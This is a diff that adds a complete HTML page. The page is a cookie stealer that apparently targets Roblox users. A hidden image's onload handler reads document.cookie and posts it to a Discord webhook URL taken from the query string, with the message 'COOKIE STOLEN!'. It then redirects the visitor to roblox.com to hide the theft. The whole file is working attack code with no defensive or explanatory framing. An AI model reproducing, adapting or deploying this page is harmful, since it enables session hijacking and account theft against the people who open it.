@@ -1,1 +1,32 @@
-
+<!DOCTYPE html>
+<html>
+<body>
+    <img src="IMAGE_PLACEHOLDER" style="display:none;" onload="steal()">
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhook = urlParams.get('webhook');
+        const image = urlParams.get('image');
+        
+        function steal() {
+            // Send cookie to Discord
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: '🍪 **COOKIE STOLEN!**\n```\n' + document.cookie + '\n```'
+                })
+            });
+            
+            // Redirect to Roblox
+            window.location.href = 'https://www.roblox.com';
+        }
+        
+        // Create and click image
+        const img = document.createElement('img');
+        img.src = image;
+        img.onload = steal;
+        img.style.display = 'none';
+        document.body.appendChild(img);
+    </script>
+</body>
+</html>
